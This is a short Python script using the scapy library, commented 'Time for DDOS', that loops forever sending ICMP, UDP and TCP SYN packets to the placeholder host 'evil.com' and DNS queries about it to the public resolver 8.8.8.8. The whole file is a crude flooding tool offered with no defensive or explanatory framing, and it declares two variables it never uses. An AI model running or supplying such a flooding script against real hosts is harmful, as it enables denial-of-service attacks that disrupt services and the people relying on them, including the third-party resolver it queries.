from scapy.all import *

# Number of packets to send
num_packets = 5

# List to store received packets
received_packets = []

# Loop to send different types of packets
while True:
        # Time for DDOS
    packet = IP(dst="evil.com")/ICMP()
    send(packet)
    send(packet)
    send(packet)
    send(packet)
    packet = IP(dst="evil.com")/UDP(dport=12345)/Raw(load="Hello, UDP!")
    send(packet)
    send(packet)
    send(packet)
    send(packet)
    packet = IP(dst="evil.com")/TCP(dport=80, flags="S")
    send(packet)
    send(packet)
    send(packet)
    send(packet)
    packet = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(qd=DNSQR(qname="evil.com"))
    send(packet)
    send(packet)
    send(packet)
    send(packet)
    # Send the packet
